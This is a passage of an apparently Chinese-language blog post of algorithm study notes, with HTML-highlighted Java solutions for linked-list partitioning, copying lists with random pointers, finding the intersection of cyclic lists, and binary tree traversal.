keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> MT <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> temp <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>LH <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> LH <span class="token operator">=</span> cur<span class="token punctuation">;</span>            <span class="token keyword">else</span> LT<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">;</span>            LT <span class="token operator">=</span> cur<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">==</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>EH <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> EH <span class="token operator">=</span> cur<span class="token punctuation">;</span>            <span class="token keyword">else</span> ET<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">;</span>            ET <span class="token operator">=</span> cur<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>MH <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> MH <span class="token operator">=</span> cur<span class="token punctuation">;</span>            <span class="token keyword">else</span> MT<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">;</span>            MT <span class="token operator">=</span> cur<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cur <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>LT<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        LT<span class="token punctuation">.</span>next <span class="token operator">=</span> EH<span class="token punctuation">;</span>        ET <span class="token operator">=</span> <span class="token punctuation">(</span>ET <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">?</span>LT<span class="token operator">:</span>ET<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ET<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> ET<span class="token punctuation">.</span>next <span class="token operator">=</span> MH<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>LH<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">?</span>LH<span class="token operator">:</span><span class="token punctuation">(</span>EH<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">?</span>EH<span class="token operator">:</span>MH<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-复制链表"><a href="#0x03-复制链表" class="headerlink" title="0x03 复制链表"></a>0x03 复制链表</h3><p>复制含有随机指针节点的链表</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> next<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> rand<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-0-2"><a href="#1-0-2" class="headerlink" title="1.0"></a>1.0</h4><p>使用哈希表，key为旧链表的节点，value为它的克隆节点，完成哈希表建立之后，遍历旧链表，节点的next即为节点对应value的next，rand同理</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token class-name">CopyListWithRandom1</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Node</span><span class="token punctuation">></span></span> hash <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        hash<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>        hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">.</span>rand <span class="token operator">=</span> hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>rand<span class="token punctuation">)</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-2"><a href="#2-0-2" class="headerlink" title="2.0"></a>2.0</h4><p>1-&gt;2-&gt;3</p><p>遍历链表，每个旧节点的next指向为该节点的克隆节点，结果即为1-&gt;1’-&gt;2-&gt;2’-&gt;3-&gt;3’</p><p>对于rand，如果1的rand指向3，那么1’的rand顺理成章指向1的rand的next，其它节点同理</p><p>对于next，只需要将该链表拆开即可完成</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token class-name">CopyListWithRandom2</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> curNext <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">=</span> curNext<span class="token punctuation">;</span>        cur <span class="token operator">=</span> curNext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>rand <span class="token operator">=</span> cur<span class="token punctuation">.</span>rand <span class="token operator">==</span> <span class="token keyword">null</span><span class="token operator">?</span><span class="token keyword">null</span><span class="token operator">:</span>cur<span class="token punctuation">.</span>rand<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span> res <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> oldNext <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">=</span> oldNext <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> oldNext<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> oldNext<span class="token punctuation">;</span>        cur <span class="token operator">=</span> oldNext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-两个单链表相交"><a href="#0x04-两个单链表相交" class="headerlink" title="0x04 两个单链表相交"></a>0x04 两个单链表相交</h3><p>两个可能有环也可能无环的单链表，如果相交（即内存地址相同），则返回相交的第一个节点，否则返回null</p><h4 id="一）首先需要判断两个链表是否有环"><a href="#一）首先需要判断两个链表是否有环" class="headerlink" title="一）首先需要判断两个链表是否有环"></a>一）首先需要判断两个链表是否有环</h4><p><code>getLoopNode(Node head)</code>有环则返回入环节点（即第一个进入环中的节点），否则返回null</p><p>使用快慢指针</p><p>a）无环，则快指针一定会到达null</p><p>b）有环，则快指针一定会与慢指针相遇，相遇之后则停，让快指针跑到头节点，慢指针停在这个相遇点，然后两者都开始每次走一步，再次相遇的点则为入环节点（证明比较麻烦，此处不证明）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">getLoopNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment">// 不让快慢指针都从头开始的原因是需要进入下面的while循环</span>    <span class="token class-name">Node</span> slow <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token class-name">Node</span> fast <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>slow<span class="token operator">!=</span>fast<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    fast <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>fast<span class="token operator">!=</span>slow<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> fast<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二）分情况讨论"><a href="#二）分情况讨论" class="headerlink" title="二）分情况讨论"></a>二）分情况讨论</h4><p>a）两个都无环的链表（loop1 == null &amp;&amp; loop2 == null）分别遍历两个链表，得到两个链表的长度差值和尾部节点，首先比较尾部节点是否为同一个（如果同一个则一定相交，下面开始找相交的第一个节点，反之，不是同一个的话，一定不相交），然后从长的开始遍历差值步，然后与短的链表一起继续向后遍历，遍历到相同内存地址，则为相交的第一个节点</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">noLoop</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head1<span class="token punctuation">,</span> <span class="token class-name">Node</span> head2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 只使用一个变量n来获得两个链表的差值，省空间大师</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur1 <span class="token operator">=</span> head1<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur1<span class="token punctuation">.</span>next <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        n<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span> cur2 <span class="token operator">=</span> head2<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur2<span class="token punctuation">.</span>next <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        n<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 执行完上面两个while之后，cur1和cur2即为两个链表的尾部节点</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur1 <span class="token operator">==</span> cur2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 现在让cur1为长的链表，cur2为短的链表</span>        cur1 <span class="token operator">=</span> n <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> head1 <span class="token operator">:</span> head2<span class="token punctuation">;</span>        cur2 <span class="token operator">=</span> cur1 <span class="token operator">==</span> head1 <span class="token operator">?</span> head2 <span class="token operator">:</span> head1<span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> cur2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> cur1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>b）两个都有环的链表（loop1 != null &amp;&amp; loop2 != null）总共就分3种情况，即为下图</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm2_f1.png"></p><p>图中第二种情况即为loop1 == loop2，寻找这种情况的第一个相交节点则与<code>a）</code>情况两个都无环链表类似，将loop1或者loop2节点当做两个链表的尾部节点即可采用完全相同的代码</p><p>那么如果两者不相等，则从loop1开始向后遍历，如果相交，则一定会遍历到loop2，返回loop1或者loop2都满足题意，否则一定不相交</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">bothLoop</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head1<span class="token punctuation">,</span> <span class="token class-name">Node</span> head2<span class="token punctuation">,</span> <span class="token class-name">Node</span> loop1<span class="token punctuation">,</span> <span class="token class-name">Node</span> loop2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>loop1 <span class="token operator">==</span> loop2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> cur1 <span class="token operator">=</span> head1<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> loop1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            n<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Node</span> cur2 <span class="token operator">=</span> head2<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur2 <span class="token operator">!=</span> loop1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 执行完上面两个while之后，cur1和cur2即为两个链表的入环节点</span>        <span class="token comment">// 现在让cur1为长的链表，cur2为短的链表</span>        cur1 <span class="token operator">=</span> n <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> head1 <span class="token operator">:</span> head2<span class="token punctuation">;</span>        cur2 <span class="token operator">=</span> cur1 <span class="token operator">==</span> head1 <span class="token operator">?</span> head2 <span class="token operator">:</span> head1<span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> cur2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> cur1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> loop1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> loop1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> loop2<span class="token punctuation">)</span> <span class="token keyword">return</span> cur<span class="token punctuation">;</span>            cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>c）剩下的情况则是有一个链表为无环，另一个则为有环，这种情况一定不会相交</p><blockquote><p>一定记住前提为单链表，即每个节点只有一个next指针，所以以上情况完全囊括了全部可能性</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">findFirstIntersecNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head1<span class="token punctuation">,</span> <span class="token class-name">Node</span> head2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> loop1 <span class="token operator">=</span> <span class="token function">getLoopNode</span><span class="token punctuation">(</span>head1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> loop2 <span class="token operator">=</span> <span class="token function">getLoopNode</span><span class="token punctuation">(</span>head2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>loop1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> loop2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">noLoop</span><span class="token punctuation">(</span>head1<span class="token punctuation">,</span> head2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>loop1 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> loop2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">bothLoop</span><span class="token punctuation">(</span>head1<span class="token punctuation">,</span> head2<span class="token punctuation">,</span> loop1<span class="token punctuation">,</span> loop2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="遍历问题"><a href="#遍历问题" class="headerlink" title="遍历问题"></a>遍历问题</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> left<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> right<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token comment">// 第一次回到当前子树的根节点</span>    <span class="token function">f</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 第二次回到当前子树的根节点</span>    <span class="token function">f</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 第三次回到当前子树的根节点</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>显然，对于先序、中序、后序遍历的递归实现往对应的注释出添加打印语句即可</p></blockquote><p>那么对于迭代怎么实现？</p><h4 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h4><p>首先准备一个栈，先压入根节点，然后循环以下操作</p><p>1）弹出一个节点，即为cur</p><p>2）打印</p><p>3）先压入右节点，再压入左节点</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">preTraversal</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 